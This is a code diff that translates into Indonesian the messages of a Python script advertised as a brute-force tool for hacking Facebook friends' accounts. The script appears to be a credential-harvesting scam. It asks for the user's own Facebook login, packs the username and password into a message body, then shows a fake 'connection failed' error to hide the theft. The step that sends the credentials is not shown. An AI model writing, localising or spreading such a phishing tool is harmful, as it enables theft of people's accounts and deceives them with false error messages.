@@ -17,9 +17,9 @@ logo = """\x1b[34m
                   ░                            ░\x1b[00m"""
 
 banner = """
-\x1b[34mHack Friendlist Facebook
-\x1b[00mAutomatic cracking password with Bruteforce
-\x1b[00mPlease login with your account \x1b[91m!
+\x1b[34mHack Teman Facebook
+\x1b[00mOtomatis Menghack Facebook Teman Menggunakan Bruteforce
+\x1b[00mSilahkan Login Menggunakan Akun Untuk Mendapatkan Email Teman\x1b[91m!
 """
 def main():
 	os.system('clear')
@@ -31,8 +31,8 @@ def main():
 	msg=('username: '+u+', password: '+p)
 	body=(msg)
 	print('')
-	print('\x1b[00mSorry, connection failed\x1b[91m !\x1b[00m')
-	print('\x1b[33mPlease try again later ...')
+	print('\x1b[00mKoneksi Bermasalah Tunggu Beberapa Saat\x1b[91m !\x1b[00m')
+	print('\x1b[33mMohon Di Coba Lagi...')
 	os.system('sleep 3')
 	print('')
 	print('\x1b[00mExiting program \x1b[91m!')
